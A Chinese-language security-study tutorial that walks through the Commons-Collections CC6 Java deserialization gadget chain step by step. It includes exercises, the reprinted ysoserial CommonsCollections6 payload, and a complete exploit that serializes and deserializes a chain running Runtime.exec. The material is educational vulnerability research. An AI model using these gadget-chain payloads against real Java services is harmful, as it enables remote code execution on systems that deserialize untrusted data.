###### tags: `Java 反序列化`


{%hackmd BJrTq20hE %}

# Java 反序列化之 CC6-3
[TOC]

<!--toc-->

一个不依赖于 JDK 版本的链子。

<!--more-->

## 前言

先说一说 CC6 链同我们之前 CC1 链的一些不同之处吧，我们当时审计 CC1 链的时候要求是比较严格的。要求的环境为 `jdk8u65` 与 `Commons-Collections 3.2.1`。而我们的 CC6 链，可以不受 JDK 版本制约。

> 如果用一句话介绍一下 CC6，那就是 CC6 = CC1 + URLDNS

CC6 链的前半条链与 CC1 正版链子是一样的，也就是到 LazyMap 链。

### 调用链流程图

以下是 ysoserial 的链子图

![](https://i.imgur.com/a0IRy3w.png)




## 环境搭建

- [Jdk 8u71](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html)
- Comoons-Collections 3.2.1

## CC6 链分析

### 前言

- 因为前半段链子，`LazyMap` 类到 `InvokerTransformer` 类是一样的，我们直接到 `LazyMap` 下。（因为现在链子到 LazyMap.get()）

然后我们还是找其他调用 `get()` 方法的地方，我也不知道这是怎么找出来的，因为 `get()` 方法如果 find usages 会有很多很多方法，可能这就是 Java 安全卷的原因吧。

### 1. InvokerTransform.transform()
org.apache.commons.collections.functors.**InvokerTransform.transform()** 方法存在反射调用任意类：

![](https://i.imgur.com/ECm13wK.png)




### 2. LazyMap.get()

>由于 Runtime 类对象不可序列化的缘故，需要将 InvokerTransformer 封装在 ChainedTransformer 内部，并借助 ConstantTransformer 转化 AnnotationInvocationHandler 。所以这一部分的链子不加以细说，不明白的读者朋友可阅读我的上一篇文章。

find usages 告诉我们 org.apache.commons.collections.map.**LazyMap.get()** 调用了 InvokerTransformer.transform()：

![](https://i.imgur.com/p0HUnog.png)

**小练习：**
此处可以尝试用 get() 方法续上之前的 transform() 进行命令执行。

> 看看源码中各个类的构造函数，你如何才能得到他们的实例？如何能调用他们的方法？调用他们的方法时应该传入什么样的参数才可命令执行呢？


以下是我的代码：
```java
public class Test {
    public static void main(String[] args) {
        // 1. 构造 Runtime 类对象
        Runtime runtime = Runtime.getRuntime();

        // 2. 构造 InvokerTransformer 类对象，直接调用 public 的那个构造方法即可

        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"});


        // 3. 构造 LazyMap 类对象，虽然构造方法是 protected，
        // 但 decorate 方法允许我们构造 LazyMap 类对象，注意需要强制类型转换，因为返回的是一个 Map

        HashMap<String,String> hashMap = new HashMap<>();

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,invokerTransformer);

        lazyMap.get(runtime);
        
    }
}
```

### 3. TiedMapEntry.getValue()

继续探寻链子的上一步，在 get() 方法处 find Usuages，然后会发现多达上千个结果，此处直接拾人牙慧。

根据 ysoserial 官方的链子，org.apache.commons.collections.keyvalue.**TiedMapEntry.getValue()** 方法调用了 LazyMap.get()。

>这里我们是否能学到一些漏洞挖掘技巧呢？比如先从同一个包下开始寻找链子，因为 get() 和 getValue() 都是 CC 包下的。

![](https://i.imgur.com/Hxllc6S.png)

很简短的代码，从上一步看过来的我们知道，只要让当前的 map 为 LazyMap 实例，key 为 Runtime 实例，那么就可以进行命令执行。

**小练习1：**
继续依据现有链子写出命令执行 demo。

我的代码：
```java
public static void main(String[] args) {
        // 1. 构造 Runtime 类对象
        Runtime runtime = Runtime.getRuntime();

        // 2. 构造 InvokerTransformer 类对象，直接调用 public 的那个构造方法即可

        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"});


        // 3. 构造 LazyMap 类对象，虽然构造方法是 protected，
        // 但 decorate 方法允许我们构造 LazyMap 类对象，注意需要强制类型转换，因为返回的是一个 Map

        HashMap<String,String> hashMap = new HashMap<>();

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,invokerTransformer);


        // 4. 构造 TiedMapEntry 实例，构造方法是 public，故可直接 new 创建。用上述的 lazyMap 和 runtime 初始化该实例
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,runtime);

        // 5. 调用 tiedMapEntry.getValue() 方法完成命令执行

        tiedMapEntry.getValue();
        
    }

```
**小练习2：**

最终链子调用时是通过反序列化来开始的，这就要求有一个序列化的过程。然而 Runtime 类对象不可序列化，所以练习1的代码在实际中是无效的，我们需将上面的代码改成能够序列化的版本。

> 如何修改？如果你学习过CC1，那这是一个很自然的答案。若你完全没有CC1的基础，请先去学习。
> 关于可变参数的传参知识，可以看看[菜鸟教程](https://www.runoob.com/w3cnote/java-varargs-parameter.html)




```java
public static void main(String[] args) {

        // 1. 构造可序列化的 Runtime 类对象并封装到 chainedTransformer 中
        // 用 Class[].class 兼容 可变参数 Class...,Object[].class 同理
        Transformer[] transformer = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);


        // 2. 构造 LazyMap 类对象，虽然构造方法是 protected，
        // 但 decorate 方法允许我们构造 LazyMap 类对象，注意需要强制类型转换，因为返回的是一个 Map

        HashMap<Map.Entry,String> hashMap = new HashMap<>();

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);


        // 4. 构造 TiedMapEntry 实例，构造方法是 public，故可直接 new 创建。用上述的 lazyMap 和 runtime 初始化该实例
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,123);//这里的key不需要是runtime实例，因为ChainedTransformer.transform 会进行转化

        tiedMapEntry.getValue();
    }

```

> 这里的逻辑还是很简单的，直接 new 一个 `TiedMapEntry` 对象，并调用它的 `getValue()` 方法即可，它的 `getValue` 方法会去调用 `map.get(key)` 方法。





现在我们确保了 `TiedMapEntry` 这一段链子的可用性，接着往上去找谁调用了 `TiedMapEntry` 中的 `getValue()` 方法

### 4. TiedMapEntry.hashCode()

- 寻找的方法也略提一嘴，因为 `getValue()` 这一个方法是相当相当常见的，所以我们一般会优先在同一类下寻找是否存在调用。

发现同类中的 `hashCode()` 方法调用了 `getValue()` 方法。

![](https://i.imgur.com/Gsxe1hz.png)


如果我们在实战的链子中找到了 `hashCode()` 方法，说明我们的构造已经可以“半场开香槟”了。

**小练习**
结合 hashCode()，改写现有链子。
>很简单，就改动一下上一个练习的最后一条语句

![](https://i.imgur.com/Amzaj5D.png)



### 5. HashMap.put() 与 HashMap.hash()

- 前文我们说到链子已经构造到 `hashCode()` 这里了，这一条 `hashCode()` 的链子该如何构造呢

我们去找谁调用了 `hashCode()` 方法，这里我就直接把答案贴出来吧，因为在 Java 反序列化当中，找到 `hashCode()` 之后的链子用的基本都是这一条。

![](https://i.imgur.com/LpUi14m.png)

根据上图的指引可以续上我们的链子，首先在之前的代码中我们已经定义了一个 HashMap 的实例 hashMap，所以可以直接拿来用。

1. 首先是 HashMap.put()

![](https://i.imgur.com/cZXITgk.png)

可以看到 `hash()` 方法作为 putval() 方法的参数被调用。

2. 其次是 HashMap.hash()

![](https://i.imgur.com/Wb36ND5.png)

3. 最后是 `key.hashCode()`，到这里详细你已经看明白了，如果 key 是一个 TiedMapEntry，我们的链子不就续上了吗？

**小练习**

根据以上分析，写一个从 HashMap 的 put 方法开始的链子。

我的代码：

```java=
package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.util.resources.cldr.zh.CalendarData_zh_Hans_HK;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class Main {

        public static void main(String[] args) throws Exception{
               Transformer[] transformers = new Transformer[]{
                       new ConstantTransformer(Runtime.class),
                       new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                       new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null,}),
                       new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
               };
               ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
               HashMap<Object,Object> hashMap = new HashMap<>();
               Map lazyMap = LazyMap.decorate(hashMap,chainedTransformer);
               TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"key");
               HashMap<Object,Object> expMap = new HashMap<>();
               expMap.put(tiedMapEntry,"value");

        }
}

```

> 这里在 27 行，也就是 `HashMap<Object, Object> expMap = new HashMap<>();` 这里打断点，会发现直接 26 行也就是 `TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");` 就弹计算器了，不要着急，这里是一个 IDEA 的小坑，后续会讲。


### HashSet.readObject()

CC6 链子的最后一部分这里还有别的选择，芜风师傅他们选择的是 **HashMap.readObject()**，但是 YSO 官方选择的是 **HashSet.readObject()**


#### HashSet.readObject()

下图是 readObject() 源码（节选）：

![](https://i.imgur.com/OQ9QD0R.png)

反序列化的时候会判断 this 是否为 LinkedHashSet 的实例，不是则实例化一个 HashMap 对象并调用其 put() 方法，作为 key 的参数 e 是从反序列化中得来，可控点全部满足，一条完美的链子入口点。

![](https://i.imgur.com/Rj6HTB2.png)

**构造思路：**
从上图可以看到，由于 map 实例域是 HashSet 的私有实例域，所以不可以直接修改，需要通过反射。
这就又引出了一个新问题，通过反射修改 map 为 HashMap 后，如何把 TiedMapEntry 存进 HashMap 里面？
这里需要知道的一个点是 HashMap 里存的 entry 都在其 table 属性域里，这一点可以在本地实验得知：

![](https://i.imgur.com/enI9CWb.png)

![](https://i.imgur.com/2cKIfQC.png)

> 我曾尝试追踪 put 方法，但是始终找不到给 table 赋值的语句。


所以反射改 map 为 HashMap，再把 HashMap 的 table 属性域的 key 改成 TiedMapEntry，value 随意。

#### 官方 EXP

```java
package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()

    by @matthias_kaiser
*/
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.MATTHIASKAISER })
public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<Serializable> {

    public Serializable getObject(final String command) throws Exception {

        final String[] execArgs = new String[] { command };

        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };

        Transformer transformerChain = new ChainedTransformer(transformers);

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);

        return map;

    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections6.class, args);
    }
}
```




### HashMap.readObject()

HashMap.readObject() 方法中可以触发 hash() 方法。下图是节选源码：

![](https://i.imgur.com/5JqsQTy.png)

可以看到，反序列化的时候会读取 HashMap 中的 key 和 value 并以此调用 hash() 方法，所以现在我们把 TiedMapEntry 作为 key 装入 HashMap 中即可。

以上操作难免引出一个问题来，那就是调用 put() 方法就会命令执行，这是我们上一步的结果。现在该如何让代码在反序列化的时候才命令执行呢？

没错，那就是通过反射。我们可以先随便找个 key 将其 put 到 HashMap，然后在序列化之前把 key 修改回 TiedMapEntry。然而糟糕的是现在并不知道 put() 方法调用之后设置了 HashMap 的哪个属性域的值，查看源码甚至会发现 HashMap 没有和 key、value、map 相关的属性域。我们唯一已知的是反序列化的时候调用输入流的反序列化方法并读出 key 和 value，然后 put in 到 HashMap 上，

与 URLDNS 中的不同，有些链子可以通过设置参数修改，有些则不行。在我们 CC6 的链子当中，通过修改这一句语句 `Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);`，可以达到我们需要的效果。

我们之前传进去的参数是 `chainedTransformer`，我们在序列化的时候传进去一个没用的东西，再在反序列化的时候通过反射，将其修改回 `chainedTransformer`。相关的属性值在 LazyMap 当中为 `factory`

![](https://i.imgur.com/0bMGoeG.png)



- 修改如下

```java=
Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");

-----------------> 变成

Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer("five"));

在执行 put 方法之后通过反射修改 Transformer 的 factory 值

// 某伪代码块
Class c = LazyMap.class;
Field factoryField = c.getDeclaredField("factory");
factoryField.setAccessible(true);
factoryField.set(lazyMap,chainedTransformer);
```



**小问题**

然而按照以上代码修改之后居然不可以弹出计算器了，这又是为什么？还记得我们前面分析的 LazyMap.get() 方法吗？

这里我们进入 if 语句块之后有一个 put 操作，把当前的 key 和 value put 到 map 中。所以一旦我们执行了

`expMap.put(tiedMapEntry, "value");`，那么就把 "key" 加到 map 中了，这样我们反序列化的时候调用 containsKey 方法就会返回真，从而调用不到 transfrom 方法，自然也就弹不出计算器了，所以我们在 put 之后，要把添加的 "key" 去掉。

![](https://i.imgur.com/XO2Wnok.png)


所以总结我们的修改：

```java=
 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        
        // 放置一个不会弹计算器的 ConstantTransformer
        Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");
        HashMap<Object, Object> expMap = new HashMap<>();

        expMap.put(tiedMapEntry, "value");
        lazyMap.remove("key"); // 把添加的 key 去掉

        // 反射修改 Transformer 的 factory 值
        Class c = LazyMap.class;
        Field factoryField = c.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap,chainedTransformer);

        serialize(expMap);
        unserialize("ser.bin");
```



#### 最终 exp

```java=
package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.util.resources.cldr.zh.CalendarData_zh_Hans_HK;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class Main {

    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");
        HashMap<Object, Object> expMap = new HashMap<>();

        expMap.put(tiedMapEntry, "value");
        lazyMap.remove("key");
        Class c = LazyMap.class;
        Field factoryField = c.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap,chainedTransformer);

        serialize(expMap);
        unserialize("ser.bin");


    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }


}

```

### 解决前文的小坑



- 还记得前文中我说的这个问题吗

> 这里在 27 行，也就是 `HashMap<Object, Object> expMap = new HashMap<>();` 这里打断点，会发现直接 26 行也就是 `TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");` 就弹计算器了，不要着急，这里是一个 IDEA 的小坑，后续会讲。

#### 原因分析

因为在 IDEA 进行 debug 调试的时候，为了展示对象的集合，会自动调用 `toString()` 方法，所以在创建 `TiedMapEntry` 的时候，就自动调用了 `getValue()` 最终将链子走完，然后弹出计算器。

![](https://i.imgur.com/uhNPTRJ.png)


#### 解决

在 IDEA 的偏好设置当中如图修改即可。

![](https://i.imgur.com/6jTPqxX.png)



> 无语了，为啥我修不好。。最可恶的是 idea 的toString 即使设置了断点也不会被触发。。。

> 破案了，上面那个也要取消勾选

![](https://i.imgur.com/1GCc6jv.png)







### 参考链接

[芜风师傅](https://drun1baby.github.io/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/)

[ysoserial-CC6](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java)